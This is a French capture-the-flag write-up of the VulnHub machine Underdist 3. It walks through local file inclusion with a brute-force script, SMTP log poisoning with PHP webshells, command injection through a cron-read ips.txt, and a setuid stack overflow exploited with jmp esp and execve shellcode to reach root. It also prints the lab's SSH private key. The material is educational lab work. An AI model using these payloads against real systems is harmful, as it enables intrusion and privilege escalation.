# Solution du CTF Underdist #3 de VulnHub

Le CTF [Underdist: 3](https://vulnhub.com/entry/underdist-3,108/) proposé sur VulnHub a été créé par le même auteur que pour le CTF [Darknet](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Darknet%20de%20VulnHub.md). On s'attend donc à un peu de difficulté.

Le CTF a été publié en novembre 2014.

```
Nmap scan report for 192.168.56.87
Host is up (0.00019s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   1024 a9b1eca1b414e9560dffb46375b4a32c (DSA)
|   2048 5eabcd931ccb1686712eb3b11f57c903 (RSA)
|_  256 bb876c13305b2219655ecaf9e94fbb0b (ECDSA)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: Underdist, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2022-12-31T13:28:30+00:00; -1s from scanner time.
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Debian)
```

Chose assez rare pour être soulignée il y a ici un port SMTP. Il y en a parfois sur les CTFs qui ne servent à rien mais on ne sait jamais...

## Saut ASCII

Sur la page web un commentaire permet de trouver une URL qui semble acepter du base64 en paramètre :

```html
<body>
<!--<a href="v.php?a=YXNjaWkxLnR4dA==">foo</a>-->
<br />
<br />
<br />
<br />
<pre>
 __  __              __                   __               __                        __         __     
/\ \/\ \            /\ \                 /\ \  __         /\ \__                   /'__`\     /'__`\   
\ \ \ \ \    ___    \_\ \     __   _ __  \_\ \/\_\    ____\ \ ,_\                 /\_\L\ \   /\ \/\ \  
 \ \ \ \ \ /' _ `\  /'_` \  /'__`\/\`'__\/'_` \/\ \  /',__\\ \ \/       _______   \/_/_\_<_  \ \ \ \ \ 
  \ \ \_\ \/\ \/\ \/\ \L\ \/\  __/\ \ \//\ \L\ \ \ \/\__, `\\ \ \_     /\______\    /\ \L\ \__\ \ \_\ \
   \ \_____\ \_\ \_\ \___,_\ \____\\ \_\\ \___,_\ \_\/\____/ \ \__\    \/______/    \ \____/\_\\ \____/
    \/_____/\/_/\/_/\/__,_ /\/____/ \/_/ \/__,_ /\/_/\/___/   \/__/                  \/___/\/_/ \/___/ 
```

Cette URL citée retourne un message 404 en ascii art.

Une fois décodé, le base64 correspond à `ascii1.txt`, fichier que l'on retrouve via énumération sous `/ascii/letras/`. On a donc une faille d'inclusion potentielle ou au moins e directory traversal.

Dans une telle situation, pas de choix, il nous faux coder un petit script car les outils existants ne vont pas nous permettre d'encoder le paramètre à la volée.

```python
import sys
from base64 import b64encode
import requests

sess = requests.session()
with open(sys.argv[1], "rb") as fd:
    for line in fd:
        line = line.strip()
        if not line:
            continue
        line = b"../../../../" + line
        url = f"http://192.168.56.87/v.php?a={b64encode(line).decode()}"
        response = sess.get(url) 
        if response.status_code != 500:
            print(f"Inclusion of {line.decode()} possible. URL {url}")
```

On accède bien aux fichiers mais ceux-çi ne sont pas très intéresants car on ne peut pas y injecter des données de quelque façon que ce soit.

```shellsession
$ python3 brute_param.py wordlists/files/Linux-files.txt
Inclusion of ../../../..//etc/passwd possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9wYXNzd2Q=
Inclusion of ../../../..//etc/group possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9ncm91cA==
Inclusion of ../../../..//etc/hosts possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9ob3N0cw==
Inclusion of ../../../..//etc/motd possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9tb3Rk
Inclusion of ../../../..//etc/issue possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9pc3N1ZQ==
Inclusion of ../../../..//etc/apache2/apache2.conf possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9hcGFjaGUyL2FwYWNoZTIuY29uZg==
Inclusion of ../../../..//etc/apache2/ports.conf possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9hcGFjaGUyL3BvcnRzLmNvbmY=
Inclusion of ../../../..//etc/apache2/sites-available/default possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9hcGFjaGUyL3NpdGVzLWF2YWlsYWJsZS9kZWZhdWx0
Inclusion of ../../../..//etc/init.d/apache2 possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9pbml0LmQvYXBhY2hlMg==
Inclusion of ../../../..//etc/mysql/my.cnf possible. URL http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9teXNxbC9teS5jbmY=
```

Un petit tour sur la liste des utilisateurs :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
dovecot:x:102:106:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:103:65534:Dovecot login user,,,:/nonexistent:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
debian-spamd:x:105:107::/var/lib/spamassassin:/bin/sh
underdist:x:1000:1000:underdist,,,:/home/underdist:/bin/bash
postfix:x:106:109::/var/spool/postfix:/bin/false
cuervo:x:1001:1001:,,,:/home/cuervo:/bin/bash
smmta:x:107:111:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:108:112:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
```

## You got mail

Le serveur web tournant certainement avec l'utilisateur `www-data`, je vais utiliser le port SMTP pour lui evoyer un email puis tenter de l'inclure :

```shellsession
$ ncat -v 192.168.56.87 25 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.87:25.
220 Underdist ESMTP Postfix (Debian/GNU)
HELO underdist
250 Underdist
MAIL FROM: zozo@hacker.com
250 2.1.0 Ok
RCPT TO: www-data
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
start<?php system($_GET["cmd"]); ?>end
.
250 2.0.0 Ok: queued as ED3309F
QUIT
221 2.0.0 Bye
```

A l'inclusion le code PHP n'apparait pas donc il est certainement interprété mais la fonction `system()` ne semble pas fonctionner :

```html
From zozo@hacker.com  Sat Dec 31 10:53:14 2022
Return-Path: <zozo@hacker.com>
X-Original-To: www-data
Delivered-To: www-data@home.lan
Received: from underdist (unknown [192.168.56.1])
	by Underdist (Postfix) with SMTP id ED3309F
	for <www-data>; Sat, 31 Dec 2022 10:52:24 -0300 (ART)

startend
```

J'ai alors renvoyé un mail avec cette commande :

```php
echo ini_get('disable_functions');
```

et on remarque que toute exécution de commande est désactivée :

```
startpcntl_alarm
pcntl_fork
pcntl_waitpid
pcntl_wait
pcntl_wifexited
pcntl_wifstopped
pcntl_wifsignaled
pcntl_wexitstatus
pcntl_wtermsig
pcntl_wstopsig
pcntl_signal
pcntl_signal_dispatch
pcntl_get_last_error
pcntl_strerror
pcntl_sigprocmask
pcntl_sigwaitinfo
pcntl_sigtimedwait
pcntl_exec
pcntl_getpriority
pcntl_setpriority
system
shell
exec
system_exec
shell_exec
mysql_pconnect
passthru
popen
proc_open
proc_close
proc_nice
proc_terminate
proc_get_status
escapeshellarg
escapeshellcmdend
```

Dans ces situations j'utilise le code suivant qui me permet de choisir dynamiquement la fonction PHP à exécuter et ses paramètres :

```php
<?php                                                                                                                  
$func = isset($_POST["f"]) ? $_POST["f"] : "";                                                                         
$arg1 = isset($_POST["a"]) ? $_POST["a"] : "";                                                                         
$arg2 = isset($_POST["b"]) ? $_POST["b"] : "";                                                                         
$ret_func = isset($_POST["rf"]) ? $_POST["rf"] : "";                                                                   
                                                                                                                        
$ret_val = "";                                                                                                         
if ($func != "") {                                                                                                     
    if ($arg1 != "" && $arg2 != "") {                                                                                  
        $ret_val = $func($arg1, $arg2);                                                                                
    } elseif ($arg1 != "") {                                                                                           
        $ret_val = $func($arg1);                                                                                       
    } else {                                                                                                           
        $ret_val = $func();                                                                                            
    }                                                                                                                  
}                                                                                                                      
                                                                                                                        
if ($ret_func != "") {                                                                                                 
    $ret_func($ret_val);                                                                                               
}                                                                                                                      
                                                                                                                        
?>
```

Par exemple pour lister les fichiers :

```bash
curl "http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vdmFyL21haWwvd3d3LWRhdGE=" --data "rf=print_r&f=scandir&a=/var/www/"
```

Je découvre un dossier ou fichier énigmatique :

```php
Array
(
    [0] => .
    [1] => ..
    [2] => ascii
    [3] => b_gd214dg
    [4] => index.html
    [5] => v.php
)
```

Il s'agit d'un dossier dans lequel je trouve un fichier de backup. Voyons son contenu :

```bash
curl "http://192.168.56.87/v.php?a=Li4vLi4vLi4vLi4vdmFyL21haWwvd3d3LWRhdGE=" --data "f=readfile&a=/var/www/b_gd214dg/foo.backup"
```

Il s'agit d'une clé privée SSH :

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz+YDrVu42bSrE+ryW4aGxAmTBs4PZvWvsLrLbibfo2cAEM3W
/0ZP1emISX7mUUW6cNfIqF+M/bkng4A0977UCIRPzPaQPHItjwDBqArHzPb0EPuc
bi70DybOsN/OIV8L1lCq45rmrwiAxC6eCtmcW+ExqsLJw98uTIUpuPQ/vu3XOiV1
leOeP2Fh5k1TYV6wg/HWemux7Z9aC8iaLkZ6wsM4s4uOdU7eiPh/6SH3ZEmusNKp
KjoxU8jSq6x/1tbMYfwp6YwCOGmtzKfQQRMqGk9V130vbfGcKALHV79qdsSCIcLI
CiGRc99Eh5k7fHVILx2VchCkktoeZc6Tou7mWQIDAQABAoIBABWidheASAg/yN3V
wUrNARE9fdNjdi7cul/F0I2x9evnOBaHlSwTgRNdrhUX45fpjbFYg0UiTGXK8tW4
bcqqTR5lxngp4HCp4RvUlFKMbKZjvJpX1LuSn0tEWpYFdEn8vhqbYm01HXRxihTg
VQoEA0V8ddKzWpPLkeHcqa7ZnBieL126vskEIZVmteorSAfRiwsYpH4zyLoT7xIt
DKABFiuKWuxoNjL30NAjvAJtdlhPrZhDhFNYF6O63/nGxTbeKg7qyHJgg7XsINz6
02z5T63uzhq767mShKtxnV+uyRlRmYLF3tdrhDf3arpHbd7z7K+/5HAY/r6EKhGB
wu8ujRECgYEA/jZxc7wxCx7c+mvqQe3E6MJgmNQhYKNVoTi83EJat5jWPA8GFXlr
AYTzYSy5KThGpqoUi1cJV2gT73LmoCzjTI07tGWL6L0VUjsceREkP0mBj0Zq8D+9
C+QSXkeC1UcIP/F1tpsW1AyjrlfeN4pbtQw3eoNNpCQhIRyfXAcfH7sCgYEA0Vw1
3V+rRSS11ABF2268qDOKWXhVxNVMiBkCelDnxuTWrDXlUYazOVuI8XXvdTfymATm
LvwD2G0J4bIjc/J+zPdBAijTRwjsgHaHklo/OJ62M4PuuErzA/RtAFzOMhX1giMc
gpiLR2hMJt04FPkW4rnstGIFQoPvK55S74C6vvsCgYBASAwQM/pC0Z8XQ8qMuU8d
fGlou9tk0GiKyAoZuD2wR1mE/lePfpBsZe4VGHYJ0k0rP77KLUwTaiIAXpGq1y7y
4JPEXhku1QFbNc9RXeBIkJHOZQQNlFB9fUKXzIVs4PVZFfmqHzV6kWeiYl2yta3S
7i/pLuKnKuulr9MsNjDMmQKBgQCjhmeYOqJ3Bj5zkab+xxbaNi+oxIIRlR0K7KXv
zgPLaXB34Dz2mcShV2q2VwyrPQDiVmlIZ5XFVR2zyMVCSjVaeQGw4xxrToATswEf
ghgBbI4Z3MH39qqr+x2se9CedGJnvG8HXojjRIa+kGm+j/SdMOW+2xUKqCyGoEpd
QeobQwKBgFhwph+eDPJFG+gNhDkH8xCebIo1n1deYdbUSXgeBzKpZ7PRbhuHiwQ4
orJfIQ1p36pShXtT6SINRO5B/s1jXVwDTEc0ISsdwwpOpNHlSRUJg2d2S1bAH+TO
w3WLPIahFHMy0GVmfSngkbEAJjVmqOHIH3Q0A/pfJaGztQL7okOt
-----END RSA PRIVATE KEY-----
```

## Ping Pong

J'arrive à l'utiliser avec le compte `cuervo`. La machine étant agée il faut passer une option supplémentaire à SSH :

```shellsession
$ ssh -i underdist.key -o PubkeyAcceptedKeyTypes=ssh-rsa cuervo@192.168.56.87
Linux Underdist 3.2.0-4-486 #1 Debian 3.2.63-2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Oct 31 04:18:54 2014 from 192.168.1.2
cuervo@Underdist:~$ id
uid=1001(cuervo) gid=1001(cuervo) grupos=1001(cuervo)
```

Dans `/home/underdist` je trouve deux fichiers : un script Python lisible et un fichier texte world-writable :

```
-rwxr-xr-x 1 underdist underdist  541 oct 27  2014 cronping.py
-rwxrwxrwx 1 underdist underdist   80 oct 27  2014 ips.txt
```

Le script est le suivant :

```python
#!/usr/bin/env python

import os

def ips():
    f=open("ips.txt")
    return f

def save(d):
    f=open("/tmp/logs", "a+")
    f.write(d)
    f.close()

def command(c):
    p=os.popen('ping -c 1 -w 1 %s|grep received|cut -d " " -f 4' % (c), "r")
    return p.read()

def verify():
    save("- - - - - - - - - - - - - - - - - - - - - - - - -\n")
    for ip in ips():
        ip=ip.replace("\n", "")
        if command(ip)=="1\n":
            save("Host %s Up\n" % (ip))
        else:
            save("Host %s Down\n" % (ip))

verify()
```

On n'a aucune indication que le script soit lancé par une crontab mais on voit qu'il est possible d'injecter une commande sur le `os.popen()` si on ajoute une ligne à la fin du fichier `ips.txt`.

J'ajoute cette ligne :

```bash
;touch /tmp/hellothere
```

Et une minute plus tard mon fichier est créé avec les droits de l'utilisateur `underdist` :

```
-rw-r--r--  1 underdist underdist    0 dic 31 11:47 hellothere
```

Je modifie ma commande afin quelle rajoute ma clé publique dans le `authorized_keys` de `underdist`.

## A l'ancienne

Une fois connecté, dans le dossier personnel de l'utilisateur je trouve un dossier caché `.bin` avec un binaire setuid root à l'intérieur :

```
./.bin:
total 16
drwx------ 2 underdist underdist 4096 oct 27  2014 .
drwxr-xr-x 4 underdist underdist 4096 oct 27  2014 ..
-rwsr-xr-x 1 root      root      4986 oct 27  2014 echo
```

Ce binaire semble vraiment basique :

```shellsession
underdist@Underdist:~$ strings .bin/echo 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
strcpy
puts
__libc_start_main
GLIBC_2.0
PTRh
QVhL
[^_]
;*2$"
Tiene correo nuevo en /var/mail/underdist
underdist@Underdist:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

L'ASLR est aussi désactivé. Reste à voir si il y a des canari pour protéger la stack :

```shellsession
underdist@Underdist:~$ .bin/echo `python -c 'print "A"*400'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Violación de segmento
underdist@Underdist:~$ dmesg | tail -1
[ 5182.001067] echo[5276]: segfault at 41414141 ip 41414141 sp bffff620 error 4
```

Visiblement non, on a écrasé EIP. Voyons l'état de la stack au moment de l'exploitation :

```shellsession
(gdb) r `python -c 'print "A"*400'`
Starting program: /home/underdist/.bin/echo `python -c 'print "A"*400'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info reg
eax            0x0      0
ecx            0xb7fd64c0       -1208130368
edx            0xb7fd7340       -1208126656
ebx            0xb7fd5ff4       -1208131596
esp            0xbffff5d0       0xbffff5d0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x41414141       0x41414141
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff5d0:      'A' <repeats 92 times>
```

Nice. Le registre esp pointe vers des données à nous, à priori sur la fin de notre chaine.

Dernière interrogation : NX est-il activé ? Un coup dans `Cutter` nous indique que non. L'exploitation devrait être triviale, on va pouvoir se passer de ROP.

Je voudrais juste écraser l'adresse de retour par celle d'un `jmp esp` mais je ne trouve aucune instruction correspondante dans le binaire (normal vu qu'il est très court et linké dynamiquement, il a un jeu d'instructions limité).

Comme l'ASLR n'est pas activé on va fouiller dans la libc qui est chargée toujours à la même adresse :

```
(gdb) info proc mappings
process 5312
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0       /home/underdist/.bin/echo
         0x8049000  0x804a000     0x1000          0       /home/underdist/.bin/echo
        0xb7e89000 0xb7e8a000     0x1000          0        
        0xb7e8a000 0xb7fd4000   0x14a000          0        /lib/i386-linux-gnu/libc-2.13.so
        0xb7fd4000 0xb7fd6000     0x2000   0x14a000        /lib/i386-linux-gnu/libc-2.13.so
        0xb7fd6000 0xb7fd7000     0x1000   0x14c000        /lib/i386-linux-gnu/libc-2.13.so
        0xb7fd7000 0xb7fda000     0x3000          0        
        0xb7fde000 0xb7fe1000     0x3000          0        
        0xb7fe1000 0xb7fe2000     0x1000          0           [vdso]
        0xb7fe2000 0xb7ffe000    0x1c000          0        /lib/i386-linux-gnu/ld-2.13.so
        0xb7ffe000 0xb7fff000     0x1000    0x1b000        /lib/i386-linux-gnu/ld-2.13.so
        0xb7fff000 0xb8000000     0x1000    0x1c000        /lib/i386-linux-gnu/ld-2.13.so
        0xbffdf000 0xc0000000    0x21000          0           [stack]
(gdb) find /b 0xb7e8a000, 0xb7fd4000, 0xff, 0xe4
0xb7e8ca35
0xb7fa1593
0xb7fb06d3
0xb7fb0753
0xb7fb0853
0xb7fb08d3
0xb7fb0953
0xb7fb125f
0xb7fb193f
0xb7fb389f
0xb7fb38fb
0xb7fbdceb
0xb7fbdf13
0xb7fbe78b
0xb7fbef0b
0xb7fbefa3
0xb7fbefc3
0xb7fbf31b
0xb7fbf663
0xb7fbfa5b
0xb7fbfa9b
0xb7fbfb13
0xb7fbfb53
0xb7fbfbd3
0xb7fbff93
0xb7fc0113
0xb7fc0483
0xb7fc05b3
0xb7fc06fb
0xb7fc0a5b
0xb7fc15f3
31 patterns found.
(gdb) x/i 0xb7e8ca35
   0xb7e8ca35:  jmp    *%esp
```

Sur la page de la libc je trouve les opcodes `ffe4` à 31 emplacements !

On va maintenant faire les choses plus proprement pour voir à quel offset se trouve l'adresse de retour ainsi que l'adresse pointée par esp.

```python
>>> from pwnlib.util.cyclic import cyclic_gen
>>> g = cyclic_gen()
>>> g.get(400)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad'
```

Je lance le binaire avec cette chaine sans répétition et je note les valeurs qui m'intéressent :

```
Program received signal SIGSEGV, Segmentation fault.
0x64616162 in ?? ()
(gdb) x/s $esp
0xbffff5d0:      "caaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad"
```

L'adresse de retour est à l'offset 304 suivie par l'adresse pour esp :

```python
>>> import struct
>>> struct.pack("<I", 0x64616162)
b'baad'
>>> g.find(struct.pack("<I", 0x64616162))
(304, 0, 304)
>>> g.find(b"caad")
(308, 0, 308)
```

Un one-liner suffit pour exploiter le binaire. Le shellcode est un setuid 0 + execve ( https://www.exploit-db.com/exploits/13359 ) :

```shellsession
underdist@Underdist:~$ .bin/echo `python -c 'print "A"*304 + "\x35\xca\xe8\xb7" + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5���jX1�̀j
                                                                                                       X�Rh//shh/bin��RS��̀
# id
uid=0(root) gid=1000(underdist) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(underdist)
# cd /root
# ls
flag.txt  r.sh
# cat flag.txt


                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`


                        http://underc0de.org



Felicidades H4x0r! resolviste el reto!

Mandame tu solucionario a: a.denegado@gmail.com

# cat r.sh
#!/bin/bash

echo 0 > /proc/sys/kernel/randomize_va_space
```

*Publié le 1er janvier 2023*
